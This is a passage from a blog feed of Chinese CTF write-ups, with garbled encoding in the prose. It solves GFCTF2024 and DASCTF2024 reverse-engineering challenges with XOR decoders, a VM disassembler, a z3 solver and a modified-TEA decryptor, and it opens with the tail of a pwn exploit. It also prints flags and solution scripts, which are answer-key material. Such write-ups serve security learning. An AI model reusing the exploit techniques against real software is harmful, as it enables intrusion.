class="hljs-built_in">hex</span>(libc_base))<br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>GFCTF2024</title>
    <link href="/2024/08/01/GFCTF2024/"/>
    <url>/2024/08/01/GFCTF2024/</url>
    
    <content type="html"><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="prese"><a href="#prese" class="headerlink" title="prese"></a>prese</h2><p>D810<img src="/2024/08/01/GFCTF2024/1722319131680-cb74dd2c-aa51-48c7-b807-9a870a1ffd4b.png" class="" title="img"></p><img src="/2024/08/01/GFCTF2024/1722319318318-2f9910f5-2841-41c9-a137-3bc4d2965252.png" class="" title="img"><p>~ ^å¯èƒ½åœ¨è¿›è¡ŒæŸç§æ“ä½œï¼Œå…ˆçŒœä¸€ä¸‹å¼‚æˆ–</p><img src="/2024/08/01/GFCTF2024/1722320429206-4b335de8-b8ef-41db-8438-89f07ef64680.png" class="" title="img"><img src="/2024/08/01/GFCTF2024/1722320298273-93aa726d-4bf3-43be-ae88-625205d611f6.png" class="" title="img"><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">DASCTF&#123;good<span class="hljs-number">_</span>the<span class="hljs-number">_</span>re<span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_</span>easyhhhh&#125;<br></code></pre></td></tr></table></figure><img src="/2024/08/01/GFCTF2024/1722327916010-a7e7d4c7-5a7b-4e87-949a-2736cf021139.png" class="" title="img"><h2 id="ezVM"><a href="#ezVM" class="headerlink" title="ezVM"></a>ezVM</h2><p>ä¸¤ä½åè¿›åˆ¶æ•°è½¬æˆä¸€ä¸ª16è¿›åˆ¶æ•°</p><img src="/2024/08/01/GFCTF2024/1722321579870-bd4ebca6-20d4-486a-9d41-91d13960a08d.png" class="" title="img"><p>44ä½flagï¼ŒåŠ è½½dllä¸­çš„checkå‡½æ•°</p><img src="/2024/08/01/GFCTF2024/1722321711399-5914079f-d3f9-4c02-8536-eab72508ceeb.png" class="" title="img"><img src="/2024/08/01/GFCTF2024/1722322021548-6bdaf24e-d5b3-4af2-aff0-a818aec3ce99.png" class="" title="img"><img src="/2024/08/01/GFCTF2024/1722322034317-a9ea7252-410e-44e3-bacb-b67b3f074674.png" class="" title="img"><img src="/2024/08/01/GFCTF2024/1722323283602-a40dff41-ead6-4c8e-b67e-ee60c883cecb.png" class="" title="img"><p>åªæœ‰å¼‚æˆ–è¿ç®—ï¼Œé‚£ä¹ˆå¯ä»¥æ ¹æ®å‰16ä½æ¨å‡ºkey</p><img src="/2024/08/01/GFCTF2024/1722329826670-277a4a1d-0c46-4e63-ba18-1559b52306cf.png" class="" title="img"><img src="/2024/08/01/GFCTF2024/1722330263081-17237543-404f-4234-b772-37fec50d089e.png" class="" title="img"><img src="/2024/08/01/GFCTF2024/1722330256009-39f50cef-4103-4ca8-baf2-eb2408b60453.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">13</span>,<span class="hljs-number">8</span>,<span class="hljs-number">26</span>,<span class="hljs-number">10</span>,<span class="hljs-number">29</span>,<span class="hljs-number">15</span>]<br>s1=<span class="hljs-string">&#x27;2x*&#123;*&#123;|&#125;qdz,&#123;&#125;d(&#125;q,dxx&#125;zd(z&#125;p&#x27;</span><br>s2=<span class="hljs-string">&#x27;(z+~&#125;yy4&#x27;</span><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    flag+=<span class="hljs-built_in">chr</span>(a[i]^<span class="hljs-number">0x49</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s1)):<br>    flag+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(s1[i])^<span class="hljs-number">0x49</span>)<br>flag+=<span class="hljs-built_in">chr</span>(<span class="hljs-number">0x7f</span>^<span class="hljs-number">0x49</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(s2)):<br>    flag+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(s2[i])^<span class="hljs-number">0x49</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(flag))<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#DASCTF&#123;1c2c2548-3e24-a48e-1143-a3496a3b7400&#125;</span><br></code></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œæ­£å¸¸æ€è·¯æ˜¯vm,op+ä¸¤ä¸ªå‚æ•°</p><img src="/2024/08/01/GFCTF2024/1722332794076-d4cff4a3-489f-4fb2-8a27-20f1a2befdb2.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python">vm = [<span class="hljs-number">0x000000A2</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000084</span>, <span class="hljs-number">0x000000A3</span>, <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x000000A3</span>, <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x00000001</span>,<br>      <span class="hljs-number">0x000000B0</span>, <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x0000013C</span>, <span class="hljs-number">0x000000B2</span>, <span class="hljs-number">0x000000A3</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x000000A3</span>, <span class="hljs-number">0x00000009</span>,<br>      <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x000000A3</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x00000003</span>, <span class="hljs-number">0x000000B0</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x0000009E</span>, <span class="hljs-number">0x000000B2</span>, <span class="hljs-number">0x000000A6</span>,<br>      <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x00000016</span>, <span class="hljs-number">0x000000A3</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x000000B0</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x00000379</span>, <span class="hljs-number">0x000000B2</span>,<br>      <span class="hljs-number">0x000000A4</span>, <span class="hljs-number">0x00000005</span>, <span class="hljs-number">0x0000000B</span>, <span class="hljs-number">0x000000A1</span>, <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x00000005</span>, <span class="hljs-number">0x000000A3</span>, <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x00000006</span>,<br>      <span class="hljs-number">0x000000B0</span>,<br>      <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x00000026</span>, <span class="hljs-number">0x000000B2</span>, <span class="hljs-number">0x000000A3</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000006</span>, <span class="hljs-number">0x000000B0</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x00000060</span>,<br>      <span class="hljs-number">0x000000B2</span>, <span class="hljs-number">0x000000A1</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x00000001</span>, <span class="hljs-number">0x000000A3</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x00000002</span>, <span class="hljs-number">0x000000A5</span>, <span class="hljs-number">0x00000009</span>,<br>      <span class="hljs-number">0x00000005</span>, <span class="hljs-number">0x000000B0</span>, <span class="hljs-number">0x00000009</span>, <span class="hljs-number">0x0000006F</span>, <span class="hljs-number">0x000000B2</span>, <span class="hljs-number">0x000000A6</span>, <span class="hljs-number">0x00000005</span>, <span class="hljs-number">0x00000007</span>, <span class="hljs-number">0x000000A1</span>,<br>      <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x00000000</span>, <span class="hljs-number">0x000000A5</span>, <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x00000006</span>, <span class="hljs-number">0x000000A3</span>, <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x00000005</span>, <span class="hljs-number">0x000000B0</span>,<br>      <span class="hljs-number">0x00000008</span>, <span class="hljs-number">0x0000035B</span>, <span class="hljs-number">0x000000B2</span>, <span class="hljs-number">0x000000A3</span>, <span class="hljs-number">0x00000003</span>, <span class="hljs-number">0x00000004</span>, <span class="hljs-number">0x000000B0</span>, <span class="hljs-number">0x00000003</span>, <span class="hljs-number">0x000002C2</span>,<br>      <span class="hljs-number">0x000000B2</span>, <span class="hljs-number">0x000000C0</span>]<br><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> vm[i] != <span class="hljs-number">192</span>:<br>    op = vm[i]<br>    <span class="hljs-keyword">if</span> op &lt; <span class="hljs-number">178</span>:<br>        arg1 = vm[i + <span class="hljs-number">1</span>]<br>        arg2 = vm[i + <span class="hljs-number">2</span>]<br>    <span class="hljs-keyword">if</span> op == <span class="hljs-number">160</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;mov key[&quot;</span> + <span class="hljs-built_in">str</span>(arg1) + <span class="hljs-string">&quot;] ,&quot;</span> + <span class="hljs-built_in">str</span>(arg2))<br>    <span class="hljs-keyword">if</span> op == <span class="hljs-number">161</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;mov key[&quot;</span> + <span class="hljs-built_in">str</span>(arg1) + <span class="hljs-string">&quot;] ,key[&quot;</span> + <span class="hljs-built_in">str</span>(arg2) + <span class="hljs-string">&quot;]&quot;</span>)<br>    <span class="hljs-keyword">if</span> op == <span class="hljs-number">162</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;add key[&quot;</span> + <span class="hljs-built_in">str</span>(arg1) + <span class="hljs-string">&quot;] ,&quot;</span> + <span class="hljs-built_in">str</span>(arg2))<br>    <span class="hljs-keyword">if</span> op == <span class="hljs-number">163</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;add key[&quot;</span> + <span class="hljs-built_in">str</span>(arg1) + <span class="hljs-string">&quot;] ,key[&quot;</span> + <span class="hljs-built_in">str</span>(arg2) + <span class="hljs-string">&quot;]&quot;</span>)<br>    <span class="hljs-keyword">if</span> op == <span class="hljs-number">164</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;sub key[&quot;</span> + <span class="hljs-built_in">str</span>(arg1) + <span class="hljs-string">&quot;] ,&quot;</span> + <span class="hljs-built_in">str</span>(arg2))<br>    <span class="hljs-keyword">if</span> op == <span class="hljs-number">165</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;sub key[&quot;</span> + <span class="hljs-built_in">str</span>(arg1) + <span class="hljs-string">&quot;] ,key[&quot;</span> + <span class="hljs-built_in">str</span>(arg2) + <span class="hljs-string">&quot;]&quot;</span>)<br>    <span class="hljs-keyword">if</span> op == <span class="hljs-number">166</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;mul key[&quot;</span> + <span class="hljs-built_in">str</span>(arg1) + <span class="hljs-string">&quot;] ,&quot;</span> + <span class="hljs-built_in">str</span>(arg2))<br>    <span class="hljs-keyword">if</span> op == <span class="hljs-number">167</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;mul key[&quot;</span> + <span class="hljs-built_in">str</span>(arg1) + <span class="hljs-string">&quot;] ,key[&quot;</span> + <span class="hljs-built_in">str</span>(arg2) + <span class="hljs-string">&quot;]&quot;</span>)<br>    <span class="hljs-keyword">if</span> op == <span class="hljs-number">176</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;cmp key[&quot;</span> + <span class="hljs-built_in">str</span>(arg1) + <span class="hljs-string">&quot;] ,&quot;</span> + <span class="hljs-built_in">str</span>(arg2))<br>    <span class="hljs-keyword">if</span> op == <span class="hljs-number">177</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;cmp key[&quot;</span> + <span class="hljs-built_in">str</span>(arg1) + <span class="hljs-string">&quot;] , key[&quot;</span> + <span class="hljs-built_in">str</span>(arg2) + <span class="hljs-string">&quot;]&quot;</span>)<br>    <span class="hljs-keyword">if</span> op == <span class="hljs-number">178</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;jz out&quot;</span>)<br>        i += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">continue</span><br>    i += <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><img src="/2024/08/01/GFCTF2024/1722333271676-199be5a4-0b82-4018-ac48-474698580fb5.png" class="" title="img"><p>ç”¨z3å¾—åˆ°key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#æ±‚è§£key</span><br>k = [Int(<span class="hljs-string">&quot;%d&quot;</span> % i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>)]<br>constraints = []<br>constraints.append(k[<span class="hljs-number">0</span>]+k[<span class="hljs-number">1</span>]+<span class="hljs-number">132</span>==<span class="hljs-number">316</span>)<br>constraints.append(k[<span class="hljs-number">1</span>]+k[<span class="hljs-number">2</span>]+k[<span class="hljs-number">3</span>]==<span class="hljs-number">158</span>)<br>constraints.append(k[<span class="hljs-number">0</span>]+<span class="hljs-number">132</span> + k[<span class="hljs-number">4</span>]*<span class="hljs-number">22</span>==<span class="hljs-number">889</span>)<br>constraints.append(k[<span class="hljs-number">6</span>]+k[<span class="hljs-number">5</span>]-<span class="hljs-number">11</span>==<span class="hljs-number">38</span>)<br>constraints.append(k[<span class="hljs-number">6</span>]+k[<span class="hljs-number">7</span>]==<span class="hljs-number">96</span>)<br>constraints.append(k[<span class="hljs-number">1</span>]+k[<span class="hljs-number">2</span>]-k[<span class="hljs-number">5</span>]+<span class="hljs-number">11</span>==<span class="hljs-number">111</span>)<br>constraints.append(k[<span class="hljs-number">0</span>]+<span class="hljs-number">132</span> + k[<span class="hljs-number">4</span>]*<span class="hljs-number">22</span> - k[<span class="hljs-number">6</span>] + (k[<span class="hljs-number">5</span>]-<span class="hljs-number">11</span>)*<span class="hljs-number">7</span> == <span class="hljs-number">859</span>)<br>constraints.append(k[<span class="hljs-number">3</span>]+k[<span class="hljs-number">4</span>]*<span class="hljs-number">22</span>==<span class="hljs-number">706</span>)<br>solver = Solver()<br>solver.add(constraints)<br><span class="hljs-keyword">if</span> solver.check() == sat:<br>    res = solver.model()<br>    <span class="hljs-built_in">print</span>(solver.model())<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VM</tag>
      
      <tag>seh</tag>
      
      <tag>æ ˆè¿ç§»</tag>
      
      <tag>æ²™ç®±ä¿æŠ¤</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF2024æš‘å‡æŒ‘æˆ˜èµ›</title>
    <link href="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <url>/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="DosSnake"><a href="#DosSnake" class="headerlink" title="DosSnake"></a>DosSnake</h2><p>å‘ç°åœ¨xor DASCTF</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721446406179-02ee1ae5-7f8e-4017-84ef-1d107cdd762f.png" class="" title="img"><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721445683045-eb77ef5a-a067-4334-8d0b-1b7f133cd0d7.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0x3F</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x37</span>,<br>  <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x24</span>,<br>  <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x3C</span>]<br>key=<span class="hljs-string">&#x27;DASCTF&#x27;</span><br>flag=<span class="hljs-string">&#x27;DASCTF&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    flag+=<span class="hljs-built_in">chr</span>(a[i]^<span class="hljs-built_in">ord</span>(key[i%<span class="hljs-number">6</span>]))<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><h2 id="Strange-programe"><a href="#Strange-programe" class="headerlink" title="Strange_programe"></a>Strange_programe</h2><p>ä¸€èˆ¬mainåœ¨codeé‡Œé¢</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721447735892-96fdfdeb-055a-4cd0-9f40-9fe2fb31dd1e.png" class="" title="img"><p>æ ¹æ®ç»éªŒçŒœæµ‹hookäº†memcmp</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721447716960-2aa15a48-1d22-44d0-8e67-06c973afef15.png" class="" title="img"><p>çœ‹åˆ°å¼‚æˆ–æ„Ÿè§‰æœ‰ç”¨ï¼Œäº¤å‰å¼•ç”¨å¾€ä¸Šæ‰¾</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721610573125-cc3b565c-5290-4598-be9c-d520e31e4433.png" class="" title="img"><p>å¼‚æˆ–ç”ŸæˆDASCTFï¼Œå…¶å®æ˜¯åœ¨è§£å¯†.DASCTFæ®µ</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721453668533-29e41ac2-8684-43e6-81ee-db8efc8ab4fa.png" class="" title="img"><p>nopæ‰åè°ƒè¯•</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721453767391-e2ecad27-a362-4f4f-87b6-c403cd317072.png" class="" title="img"><p>è¿›å…¥1064å‘ç°è·³åˆ°.DASCTFæ®µï¼Œå¤„ç†èŠ±æŒ‡ä»¤</p><p>ä¸‹é¢åœ¨éå†IATè·å–memcmpçš„åœ°å€</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721610926637-efc98525-bec9-46c3-8651-230aebcae536.png" class="" title="img"><p>ç„¶åå°±æ˜¯hook</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721610995965-958252cd-6306-41aa-a44c-8bd4a191b53e.png" class="" title="img"><p>é­”æ”¹tea</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721454365152-bf252f1e-f321-4d0e-8637-022c2e1544b6.png" class="" title="img"><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721454632349-70fc14c7-5093-46aa-850c-b92a20726dae.png" class="" title="img"><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721454726441-a38c9779-d73c-439a-b940-98a280ff9c33.png" class="" title="img"><p>å¼‚æˆ–ç¬¬ä¸€ä½å’Œç¬¬äºŒä½</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721459036728-9d5570f3-81fe-458b-83cb-4bd08c876ae2.png" class="" title="img"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">decrypt</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> *v, <span class="hljs-type">uint32_t</span> *k)</span><br>&#123;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], i;<br>    <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">0x9e3779b9</span>;<br>    <span class="hljs-type">uint32_t</span> sum = delta * <span class="hljs-number">16</span>;<br>    <span class="hljs-type">uint32_t</span> k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++)<br>    &#123;<br>        sum -= delta;<br>        v1 -= ((v0 &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + k3);<br>        v0 -= ((v1 &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + k1);<br><br>    &#125;<br>    v[<span class="hljs-number">0</span>] = v0; v[<span class="hljs-number">1</span>] = v1;<br>&#125;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> enc[<span class="hljs-number">10</span>] = &#123;<br>    <span class="hljs-number">0xBC2B4DF9</span>, <span class="hljs-number">0x6213DD13</span>, <span class="hljs-number">0x89FFFCC9</span>, <span class="hljs-number">0x0FC94F7D</span>, <span class="hljs-number">0x526D1D63</span>, <span class="hljs-number">0xE341FD50</span>, <span class="hljs-number">0x97287633</span>, <span class="hljs-number">0x6BF93638</span>, <br>    <span class="hljs-number">0x83143990</span>, <span class="hljs-number">0x1F2CE22C</span><br>    &#125;;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> key[<span class="hljs-number">4</span>] = &#123;<br>    <span class="hljs-number">0x12345678</span>, <span class="hljs-number">0x09101112</span>, <span class="hljs-number">0x13141516</span>, <span class="hljs-number">0x15161718</span><br>    &#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">9</span>; i &gt;= <span class="hljs-number">2</span>; i-=<span class="hljs-number">2</span>)<br>    &#123;<br>        enc[i] ^= enc[<span class="hljs-number">1</span>];<br>        enc[i - <span class="hljs-number">1</span>] ^= enc[<span class="hljs-number">0</span>];<br>        decrypt(enc, key);<br>    &#125;<br>    decrypt(enc, key);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, enc);<br>&#125;<br>DASCTF&#123;I4TH0ok_I5S0ooFunny_Isnotit?????&#125;<br></code></pre></td></tr></table></figure><h2 id="BabyAndroid"><a href="#BabyAndroid" class="headerlink" title="BabyAndroid"></a>BabyAndroid</h2><p>ç›´æ¥æœDASå‘ç°rc4ç®—æ³•</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721479758614-f957e298-f9eb-4a59-9413-5aae48da78ef.png" class="" title="img"><p>loaddataè°ƒç”¨jpg</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721479794670-542fdd6e-35f4-4cec-b857-dd25a023a01b.png" class="" title="img"><p>è§£å¯†å¾—åˆ°dex</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721464582687-3788dd1b-dfe7-4a8c-a46d-78cc5d6af9d2.png" class="" title="img"><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721466691572-e39100aa-23ea-4cf6-8656-914f06fde8ce.png" class="" title="img"><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721611216992-1f4f8cd7-2e80-46e0-957e-29d12895a69a.png" class="" title="img"><p>æ²¡æƒ³åˆ°æ˜¯ç”¨0d</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721611229826-1835cb83-98ad-4dbd-95ea-4aa152f7d7c4.png" class="" title="img"><p>è„šæœ¬è§£å‡ºæ¥ä¸€å †æ•°å­—</p><img src="/2024/07/24/DASCTF2024%E6%9A%91%E5%81%87%E6%8C%91%E6%88%98%E8%B5%9B/1721479424527-b69fdb76-89bf-4b8a-814f-ec465fa81ad0.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> Crypto.Cipher <span 